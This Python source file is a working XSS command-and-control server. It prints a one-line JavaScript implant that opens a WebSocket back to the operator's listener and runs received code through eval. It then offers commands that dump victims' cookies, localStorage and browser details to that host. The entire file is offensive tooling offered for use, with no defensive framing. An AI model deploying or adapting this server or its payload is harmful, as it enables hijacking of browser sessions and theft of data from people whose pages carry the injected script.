import argparse
import asyncio
import re
import subprocess
import sys
import websockets
from datetime import datetime
import platform

class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

parser = argparse.ArgumentParser(description="""Real-time WebSockets-based C2 server that allows dynamic JS execution and implants as an XSS payload.""")
parser.add_argument('-l', '--listener', help='Listening IP address for callback', required=True)
parser.add_argument('-p', '--port', type=str, help='Listening port for callback.', required=True)
args = parser.parse_args()

async def handler(websocket):
    now = datetime.now()
    connect_time = now.strftime("%H:%M:%S")
    ip, port = websocket.remote_address
    print(bcolors.BOLD + f"[+] New client connected! Information: {ip}:{port}" + bcolors.ENDC)
    try:
        while True:
            command = input('Command: ')
            try:
                message = await asyncio.wait_for(websocket.recv(), timeout=0.1)
                print(bcolors.OKGREEN + message + bcolors.ENDC)
            except asyncio.exceptions.CancelledError:
                pass
            except asyncio.exceptions.TimeoutError:
                pass
            if command == "help":
                print(bcolors.OKGREEN + "send [command] - executes command in JS on remote host\nhelp - lists help screen\nsendRet [command] - executes command in JS on remote host and waits 5 seconds for output\nclients - lists connected hosts\ncommands - lists preset commands" + bcolors.ENDC)
            elif command == "clients":
                if platform.system() == "Windows":
                    result = subprocess.run(["ping", "-n", "1", ip], stdout=subprocess.PIPE).stdout.decode()
                    latency = float(re.search(r'(?<=time.).*?([\d.]+)', result).group(1))
                else:
                    result = subprocess.run(["ping", "-c", "1", ip], stdout=subprocess.PIPE).stdout.decode()
                    latency = float(re.search(r"time=(\d+\.\d+) ms", result).group(1))
                print(bcolors.OKGREEN + f"{ip}:{port} at {connect_time} with latency '{latency}'" + bcolors.ENDC)
            elif command.split(" ")[0] == "send":
                await websocket.send(command[5:])
                try: 
                    message = await asyncio.wait_for(websocket.recv(), timeout=0.1)
                    print(bcolors.OKGREEN + message + bcolors.ENDC)
                except asyncio.exceptions.TimeoutError:
                    pass
            elif command.split(" ")[0] == "sendRet":
                await websocket.send("1 " + command[8:])
                try: 
                    message = await asyncio.wait_for(websocket.recv(), timeout=5.0)
                    print(bcolors.OKGREEN + message + bcolors.ENDC)
                except asyncio.exceptions.TimeoutError:
                    pass
            elif command == "commands":
                print(bcolors.OKGREEN + "sysinfo - returns browser information\ndumplocal - returns local storage\ndumpcookies - returns cookies\n" + bcolors.ENDC) 
            elif command == "sysinfo":
                await websocket.send('sArray=[];a=navigator;sArray.push(a.appName,a.appCodeName,a.appVersion,a.cookieEnabled,a.userAgent);s.send(JSON.stringify(sArray));')
                try: 
                    message = await asyncio.wait_for(websocket.recv(), timeout=0.1)
                    print(bcolors.OKGREEN + message + bcolors.ENDC)
                except asyncio.exceptions.TimeoutError:
                    pass
            elif command == "dumplocal":
                await websocket.send('sArray=[];Object.entries(localStorage).forEach(([key, value]) => sArray.push(key, value));s.send(JSON.stringify(sArray));')
                try: 
                    message = await asyncio.wait_for(websocket.recv(), timeout=5.0)
                    print(bcolors.OKGREEN + message + bcolors.ENDC)
                except asyncio.exceptions.TimeoutError:
                    pass
            elif command == "dumpcookies":
                await websocket.send('sArray=[];x1=document.cookie.split(\';\').forEach(function(cookie){sArray.push(cookie);});s.send(sArray);')
                try: 
                    message = await asyncio.wait_for(websocket.recv(), timeout=5.0)
                    print(bcolors.OKGREEN + message + bcolors.ENDC)
                except asyncio.exceptions.TimeoutError:
                    pass
            else:
                print("Invalid Command! Try using 'help'")
    except websockets.exceptions.ConnectionClosedOK:
        print(bcolors.FAIL + "[!] Remote client closed connection." + bcolors.ENDC)
    except:
        raise KeyboardInterrupt
async def start():
    print("Awaiting connection...")
    server = await websockets.serve(handler, args.listener, int(args.port))
    async with server:
        await server.wait_closed()
if __name__ == '__main__':
    print('(s=new WebSocket("ws://%s:%s")).onmessage=t=>{t.data.startsWith("1 ")?s.send(eval((t.data).substr(2))):eval(t.data)};' % (args.listener, args.port))
    try:
        asyncio.run(start())
    except Exception as e:
        print(e)
        sys.exit(-1)